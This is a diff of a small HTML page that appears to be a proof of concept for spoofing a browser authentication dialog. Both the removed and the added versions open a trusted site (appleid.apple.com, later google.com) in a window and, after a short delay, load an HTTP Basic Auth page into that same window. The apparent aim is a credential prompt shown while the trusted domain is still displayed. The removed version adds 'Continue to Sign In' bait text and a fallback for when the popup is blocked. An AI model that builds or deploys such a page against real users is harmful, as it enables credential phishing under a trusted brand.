@@ -3,64 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Continue</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            background: #f5f5f7;
-            flex-direction: column;
-            gap: 16px;
-        }
-        a {
-            display: inline-block;
-            padding: 14px 36px;
-            background: #0071e3;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 10px;
-            font-size: 17px;
-        }
-        .note { color: #86868b; font-size: 13px; text-align: center; padding: 0 20px; }
-    </style>
+    <title>google.com</title>
 </head>
 <body>
-    <a href="#" id="btn">Continue to Sign In</a>
-    <p class="note" id="status"></p>
-
     <script>
-        document.getElementById('btn').addEventListener('click', function(e) {
-            e.preventDefault();
+        (() => {
+            const button = document.createElement('button');
+            button.innerText = 'Click Me';
+            button.style.cssText = 'padding:14px 32px;font-size:17px;cursor:pointer;';
 
-            // Method 1: Save window reference, navigate later
-            var w = window.open('https://appleid.apple.com');
-
-            if (w) {
-                document.getElementById('status').textContent = 'Window opened, waiting...';
-                setTimeout(function() {
-                    try {
-                        // Navigate existing window to auth page
-                        // Not a new popup, just changing location of existing window
-                        w.location.href = 'https://authenticationtest.com/HTTPAuth/';
-                        document.getElementById('status').textContent = 'Auth page loaded. Check the address bar!';
-                    } catch(err) {
-                        document.getElementById('status').textContent = 'Error: ' + err.message;
-                    }
-                }, 2500);
-            } else {
-                // Popup blocked - try alternative: navigate current window
-                document.getElementById('status').textContent = 'Popup blocked. Trying redirect method...';
-
-                // Alternative: navigate THIS window instead
-                // First load apple.com, set a timer via the page's beforeunload
-                sessionStorage.setItem('auth_redirect', '1');
-                window.location.href = 'https://appleid.apple.com';
-            }
-        });
+            button.addEventListener('click', () => {
+                window.open('https://google.com', 'g');
+                setTimeout(() => {
+                    window.open('https://authenticationtest.com/HTTPAuth/', 'g');
+                }, 2000);
+            });
+            document.body.appendChild(button);
+        })();
     </script>
 </body>
 </html>
